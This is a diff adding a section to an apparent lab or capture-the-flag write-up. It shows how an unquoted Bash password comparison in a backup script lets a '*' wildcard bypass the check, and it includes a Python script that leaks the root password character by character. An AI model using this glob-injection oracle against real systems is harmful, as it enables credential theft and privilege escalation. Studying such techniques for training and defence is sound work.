@@ -107,4 +107,41 @@ done
 /usr/bin/echo 'Done!'
 ```
 
-How can the file be abused?
+How can the file be abused? Well, in Bash the read command does not return a string, so it is mandatory to quote the right part of line 9. Why? Because if it is not quoted it is possible to do a pattern match that will expose the root password. For example, when the script runs and asks you to enter the password, it is possible to type a "*" and avoid comparing passwords and run the whole script, as shown below:
+
+[![Ejecucion.png](https://i.postimg.cc/HxCzYLSR/Ejecucion.png)](https://postimg.cc/mc8CVTWy)
+
+With this concept in mind, it is possible to create a script that will dump the root password:
+
+```python
+#!/usr/bin/env python3
+
+import sys,signal,time,subprocess,string,re
+
+def def_handler(sig,frame):
+    print("\n[!] Saliendo...\n")
+    sys.exit(1)
+
+#CTRL_C
+signal.signal(signal.SIGINT,def_handler)
+
+if __name__ == "__main__":
+    characters = string.ascii_letters + string.digits + "#$%&'()+,-./:;<=>?@[]^_`{|} ~"
+    root_password = ""
+    patron = r'Password confirmed!'
+
+    while True:
+
+        for character in characters:
+
+            salida=subprocess.run('/opt/scripts/mysql-backup.sh',input=root_password+character+"*",shell=True,stdout=subprocess.PIPE,text=True)
+
+            if re.search(patron,str(salida)):
+                root_password = root_password + character
+                break
+        
+        if character == characters[-1]:
+            break
+
+print("La contraseña es: " + root_password)
+```
